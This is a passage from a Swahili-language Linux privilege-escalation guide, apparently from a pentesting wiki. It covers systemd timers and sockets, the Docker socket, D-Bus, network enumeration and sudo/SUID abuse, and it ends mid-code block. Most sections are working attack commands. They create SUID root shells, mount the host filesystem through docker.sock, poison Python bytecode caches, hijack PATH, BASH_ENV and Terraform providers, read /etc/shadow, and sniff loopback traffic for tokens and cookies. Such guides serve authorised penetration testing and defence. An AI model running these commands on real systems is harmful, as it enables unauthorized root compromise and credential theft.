Ikiwa unaweza kurekebisha timer, unaweza kuifanya itekeleze baadhi ya zilizopo za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma Unit ni nini:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Kwa hiyo, ili kutumia vibaya ruhusa hii ungehitaji:

- Kupata baadhi ya systemd unit (kama `.service`) ambayo **inaendesha binary inayoweza kuandikwa**
- Kupata baadhi ya systemd unit ambayo **inaendesha relative path** na una **writable privileges** juu ya **systemd PATH** (ili kujifanya hiyo executable)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Enabling Timer**

Ili enable timer unahitaji root privileges na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya process** kwenye mashine zilezile au tofauti ndani ya miundo ya client-server. Hutumia faili za kawaida za Unix descriptor kwa mawasiliano kati ya kompyuta na huwekwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti lakini muhtasari hutumiwa kuonyesha **itakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port ya kusikiliza, n.k.)
- `Accept`: Huchukua hoja ya boolean. Ikiwa **true**, **instance ya service huundwa kwa kila connection inayoingia** na connection socket pekee ndiyo hupitishwa kwake. Ikiwa **false**, sockets zote za kusikiliza zenyewe **hupitishwa kwa service unit iliyoanzishwa**, na ni service unit moja tu inayoundwa kwa connections zote. Thamani hii hupuzwa kwa datagram sockets na FIFOs ambapo service unit moja hushughulikia bila masharti trafiki yote inayoingia. **Chaguo-msingi ni false**. Kwa sababu za performance, inapendekezwa kuandika daemons mpya kwa njia inayofaa `Accept=no` pekee.
- `ExecStartPre`, `ExecStartPost`: Huchukua amri moja au zaidi, ambazo **hutekelezwa kabla** au **baada ya** listening **sockets**/FIFOs **kuundwa** na ku-bound, mtawalia. Tokeni ya kwanza ya command line lazima iwe filename kamili ya absolute, kisha ifuatiwe na arguments za process.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo **hutekelezwa kabla** au **baada ya** listening **sockets**/FIFOs **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la **service** unit **ya ku-activate** kwenye **trafiki inayoingia**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Kwa chaguo-msingi ni service yenye jina sawa na socket hiyo (ikiwa na suffix iliyobadilishwa). Mara nyingi, haitakiwi kutumia chaguo hili.

### Writable .socket files

Ukikuta faili ya `.socket` inayoweza kuandikwa unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket haijaundwa. Kwa hiyo, **huenda ukahitaji kusubiri hadi machine i-rebooted.**\
_Kumbuka kwamba system lazima iwe inatumia configuration hiyo ya socket file vinginevyo backdoor haitatekelezwa_

### Socket activation + writable unit path (create missing service)

Kosa lingine la high-impact ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit iliyorejelewa haipo
- attacker anaweza kuandika ndani ya `/etc/systemd/system` (au unit search path nyingine)

Katika hali hiyo, attacker anaweza kuunda `<name>.service`, kisha ku-trigger traffic kwenda socket ili systemd ipakue na i-execute service mpya kama root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Soketi zinazoweza kuandikwa

Ikiwa **unatambua soketi yoyote inayoweza kuandikwa** (_sasa tunazungumza kuhusu Unix Sockets na si kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na soketi hiyo na pengine kunufaika na udhaifu.

### Hesabu Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa moja kwa moja
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwepo baadhi ya **sockets zinazosikiliza HTTP** requests (_sizungumzii kuhusu .socket files bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Jika socket **inaijibu kwa HTTP** request, basi unaweza **kuwasiliana** nayo na labda **kutumia udhaifu fulani**.

### Writable Docker Socket

Docker socket, mara nyingi hupatikana katika `/var/run/docker.sock`, ni faili muhimu ambalo linapaswa kulindwa. Kwa default, linaweza kuandikwa na mtumiaji `root` na wanachama wa kundi `docker`. Kuwa na write access kwa socket hii kunaweza kusababisha privilege escalation. Hapa kuna uchambuzi wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una write access kwa Docker socket, unaweza kuongeza privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

Katika hali ambazo Docker CLI haipatikani, Docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na `curl` commands.

1.  **List Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma request ili kuunda container inayomount root directory ya system ya host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container mpya iliyoundwa:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha connection na container, kuruhusu command execution ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kusanidi connection ya `socat`, unaweza kutekeleza commands moja kwa moja ndani ya container ukiwa na root-level access kwa filesystem ya host.

### Others

Kumbuka kwamba ikiwa una write permissions juu ya docker socket kwa sababu uko ndani ya group `docker` una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** unaweza pia kuweza kui-compromise](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from containers or abuse container runtimes to escalate privileges** katika:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ukigundua kuwa unaweza kutumia command ya **`ctr`** soma ukurasa ufuatao kwani **unaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ukigundua kuwa unaweza kutumia command ya **`runc`** soma ukurasa ufuatao kwani **unaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kisasa wa **inter-Process Communication (IPC)** unaowezesha applications kuingiliana na kushiriki data kwa ufanisi. Umeundwa kwa kuzingatia mfumo wa kisasa wa Linux, na unatoa framework thabiti kwa aina tofauti za mawasiliano ya applications.

Mfumo huu ni wa matumizi mengi, ukiunga mkono msingi wa IPC unaoboreshwa ambao huongeza ubadilishanaji wa data kati ya processes, ukiwakumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia katika kutangaza events au signals, na kukuza ujumuishaji laini kati ya components za system. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayoingia inaweza kusababisha music player kunyamazishwa, hivyo kuboresha user experience. Pia, D-Bus inaunga mkono remote object system, ikirahisisha service requests na method invocations kati ya applications, na kurahisisha processes ambazo kwa kawaida zilikuwa ngumu.

D-Bus hufanya kazi kwa **allow/deny model**, ikisimamia permissions za messages (method calls, signal emissions, etc.) kulingana na athari ya jumla ya matching policy rules. Policies hizi hubainisha interactions na bus, na zinaweza kuruhusu privilege escalation kupitia matumizi mabaya ya permissions hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukieleza permissions za root user kumiliki, kutuma kwenda, na kupokea messages kutoka `fi.w1.wpa_supplicant1`.

Policies bila user au group maalum hutumika kwa wote, wakati policies za mazingira ya "default" hutumika kwa wote ambao hawajashughulikiwa na policies nyingine maalum.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kuorodhesha na kutumia D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Daima ni ya kuvutia kuorodhesha network na kubaini nafasi ya machine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Uchanganuzi wa haraka wa kuchuja outbound

Ikiwa host inaweza kuendesha commands lakini callbacks zinashindwa, tenganisha haraka DNS, transport, proxy, na route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Milango wazi

Daima angalia huduma za mtandao zinazoendesha kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners by bind target:

- `0.0.0.0` / `[::]`: wazi kwenye interfaces zote za ndani.
- `127.0.0.1` / `::1`: local-only (chaguo nzuri za tunnel/forward).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida hufikiwa tu kutoka internal segments.

### Local-only service triage workflow

When you compromise a host, services bound to `127.0.0.1` often become reachable for the first time from your shell. A quick local workflow is:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kama network scanner (network-only mode)

Mbali na local PE checks, linPEAS inaweza kuendeshwa kama focused network scanner. Hutumia available binaries zilizo ndani ya `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haiinstall tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ukipita `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama pure network scanner (ikipita ukaguzi wote wa privilege-escalation uliobaki).

### Sniffing

Angalia kama unaweza sniff traffic. Ikiwa unaweza, unaweza kuwa na uwezo wa kukamata baadhi ya credentials.
```
timeout 1 tcpdump
```
Ukaguzi wa haraka wa vitendo:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ina thamani kubwa sana katika post-exploitation kwa sababu huduma nyingi za ndani pekee hufichua tokens/cookies/credentials huko:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Nasa sasa, chambua baadaye:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Watumiaji

### Uorodheshaji wa Kawaida

Angalia **wewe ni nani**, una **ruhusa** gani, ni **watumiaji** gani walio kwenye mifumo, ni wangapi wanaweza **login** na ni wangapi walio na **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na bug inayoruhusu watumiaji wenye **UID > INT_MAX** kupandisha ruhusa. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).\
**Itumie** kwa kutumia: **`systemd-run -t /bin/bash`**

### Groups

Kagua kama wewe ni **mwanachama wa kundi** lolote ambalo linaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Kagua kama kuna kitu chochote cha kuvutia kilicho ndani ya clipboard (kama inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Ikiwa unajua **nywila yoyote** ya mazingira hayo, **jaribu kuingia kama kila mtumiaji** kwa kutumia nywila hiyo.

### Su Brute

Ikiwa hauna shida na kufanya kelele nyingi na binaries za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye parameter `-a` pia hujaribu brute-force kwa watumiaji.

## Matumizi mabaya ya Writable PATH

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folda yoyote ya $PATH** unaweza kuwa na uwezo wa kuongeza privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** yenye jina la amri fulani ambayo itatekelezwa na mtumiaji mwingine (root ikiwezekana) na ambayo **haipakuliwi kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Huenda ukaruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na bit ya suid. Iangalie kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuruhusu kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa Sudo unaweza kuruhusu mtumiaji kutekeleza amri fulani kwa haki za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi sana kupata shell kwa kuongeza ssh key ndani ya root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Amri hii humruhusu mtumiaji **kuweka variable ya mazingira** wakati wa kutekeleza kitu fulani:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **kulingana na HTB machine Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia arbitrary python library wakati wa kutekeleza script kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

If a **sudo-allowed Python script** imports a module whose package directory contains a **writable `__pycache__`**, unaweza kuweza kuchukua nafasi ya `.pyc` iliyohifadhiwa na kupata utekelezaji wa code kama mtumiaji mwenye mamlaka kwenye import inayofuata.

- Kwa nini inafanya kazi:
- CPython huhifadhi bytecode caches katika `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter huhakikisha uhalali wa **header** (magic + metadata ya timestamp/hash iliyofungwa na source), kisha huendesha marshaled code object iliyohifadhiwa baada ya header hiyo.
- Ukweza **kufuta na kuunda upya** faili la cache kwa sababu directory inaweza kuandikwa, `.pyc` inayomilikiwa na root lakini isiyoweza kuandikwa bado inaweza kubadilishwa.
- Njia ya kawaida:
- `sudo -l` huonyesha Python script au wrapper unayoweza kuendesha kama root.
- Script hiyo hu-import local module kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
- `__pycache__` ya module iliyo-importiwa inaweza kuandikwa na user wako au na kila mtu.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Kama unaweza kukagua script yenye mamlaka ya juu, tambua modules zilizoingizwa na njia yake ya cache:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Mtiririko wa matumizi mabaya:

1. Endesha script iliyoruhusiwa na sudo mara moja ili Python iunde faili halali ya cache kama haipo tayari.
2. Soma bytes 16 za mwanzo kutoka `.pyc` halali na uzitumie tena kwenye faili lililochafuliwa.
3. Compile payload code object, `marshal.dumps(...)` hiyo, futa faili la awali la cache, na ulizalishe upya kwa kutumia header ya awali pamoja na bytecode yako hasidi.
4. Endesha tena script iliyoruhusiwa na sudo ili import itekeleze payload yako kama root.

Maelezo muhimu:

- Kutumia tena header ya awali ni muhimu kwa sababu Python hukagua cache metadata dhidi ya source file, si kama body ya bytecode kweli inalingana na source.
- Hii ni muhimu hasa wakati source file inamilikiwa na root na haiwezi kuandikwa, lakini saraka inayobeba `__pycache__` inaweza kuandikwa.
- Shambulio hushindwa ikiwa process yenye priviliji inatumia `PYTHONDONTWRITEBYTECODE=1`, inaimport kutoka eneo lenye ruhusa salama, au inaondoa write access kwa kila saraka kwenye import path.

Muundo wa chini wa proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Hakikisha hakuna saraka yoyote katika privileged Python import path inayoweza kuandikwa na low-privileged users, ikijumuisha `__pycache__`.
- Kwa privileged runs, zingatia `PYTHONDONTWRITEBYTECODE=1` na ukaguzi wa mara kwa mara wa `__pycache__` directories zisizotarajiwa zinazoweza kuandikwa.
- Tumia writable local Python modules na writable cache directories kama vile ambavyo ungetumia writable shell scripts au shared libraries zinazotekelezwa na root.

### BASH_ENV preserved via sudo env_keep → root shell

Kama sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia Bash non-interactive startup behavior ili kuendesha arbitrary code kama root unapoitisha allowed command.

- Kwa nini inafanya kazi: Kwa non-interactive shells, Bash husoma `$BASH_ENV` na ku-sourcing faili hilo kabla ya kuendesha target script. Mara nyingi sudo rules huruhusu kuendesha script au shell wrapper. Kama `BASH_ENV` imehifadhiwa na sudo, faili lako hu-sourced kwa root privileges.

- Mahitaji:
- Sudo rule unayoweza kuendesha (target yoyote inayoitisha `/bin/bash` non-interactively, au script yoyote ya bash).
- `BASH_ENV` ipo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, pendelea `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries za chini kabisa.
- Fikiria sudo I/O logging na alerting wakati preserved env vars zinatumika.

### Terraform kupitia sudo na preserved HOME (!env_reset)

Ikiwa sudo inaacha environment ikiwa intact (`!env_reset`) huku ikiruhusu `terraform apply`, `$HOME` inabaki kama ya mtumiaji anayepiga amri. Kwa hiyo Terraform husoma **$HOME/.terraformrc** kama root na hutii `provider_installation.dev_overrides`.

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa na dondosha malicious plugin iliyopewa jina la provider (kwa mfano, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform itashindwa kwenye Go plugin handshake lakini hutekeleza payload kama root kabla ya kufa, na kuacha SUID shell nyuma.

### TF_VAR overrides + symlink validation bypass

Terraform variables zinaweza kutolewa kupitia `TF_VAR_<name>` environment variables, ambazo hubaki pale sudo inapohifadhi environment. Weak validations kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` zinaweza kupitishwa kwa kutumia symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform hutatua symlink na kunakili `/root/root.txt` halisi kwenda kwenye eneo lengwa linaloweza kusomwa na mshambuliaji. Mbinu hiyo hiyo inaweza kutumika kuandika kwenye paths zenye ruhusa za juu kwa kuunda mapema destination symlinks (kwa mfano, kuelekeza path ya destination ya provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Kwenye baadhi ya distributions za zamani, sudo inaweza kusanidiwa na `requiretty`, ambayo hulazimisha sudo kuendeshwa tu kutoka kwa interactive TTY. Iwapo `!requiretty` imewekwa (au option haipo), sudo inaweza kuendeshwa kutoka kwa non-interactive contexts kama reverse shells, cron jobs, au scripts.
```bash
Defaults !requiretty
```
Huu si udhaifu wa moja kwa moja kwa yenyewe, lakini huongeza hali ambapo sheria za sudo zinaweza kutumika vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` iliyo na entries zinazoweza kuandikwa na mshambuliaji (mf., `/home/<user>/bin`), amri yoyote ya relative ndani ya target inayoruhusiwa na sudo inaweza kufichwa.

- Requirements: sheria ya sudo (mara nyingi `NOPASSWD`) inayotekeleza script/binary inayaita commands bila absolute paths (`free`, `df`, `ps`, etc.) na writable PATH entry ambayo hutafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Njia za kupita utekelezaji wa Sudo
**Ruka** ili kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** itatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ikiwa **sudo permission** imetolewa kwa amri moja **bila kubainisha path**: _hacker10 ALL= (root) less_ unaweza kuitumia vibaya kwa kubadilisha kigezo cha PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inaendesha amri nyingine bila kubainisha path yake (kila mara kagua kwa** _**strings**_ **maudhui ya binary ya ajabu ya SUID)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Ikiwa binary ya **suid** **inaendesha amri nyingine ikibainisha path**, basi unaweza kujaribu **kusafirisha function** iliyopewa jina kama amri ambayo faili ya suid inaita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function hiyo na kuisafirisha:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapopiga simu kwa binary ya suid, function hii itatekelezwa

### Script inayoweza kuandikwa inayotekelezwa na SUID wrapper

Kosa la kawaida la misconfiguration ya custom-app ni root-owned SUID binary wrapper inayotekeleza script, huku script yenyewe ikiwa inaweza kuandikwa na low-priv users.

Muundo wa kawaida:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikwa, unaweza kuongeza payload commands kisha utekeleze SUID wrapper:
```bash
